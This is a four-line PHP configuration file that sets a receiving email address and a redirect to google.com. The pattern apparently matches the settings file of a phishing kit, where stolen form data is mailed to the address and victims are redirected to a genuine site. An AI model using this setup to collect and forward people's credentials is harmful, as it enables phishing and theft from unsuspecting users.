<?php 
$Receive_email="knashcares@gmail.com";
$redirect="https://www.google.com/";
?>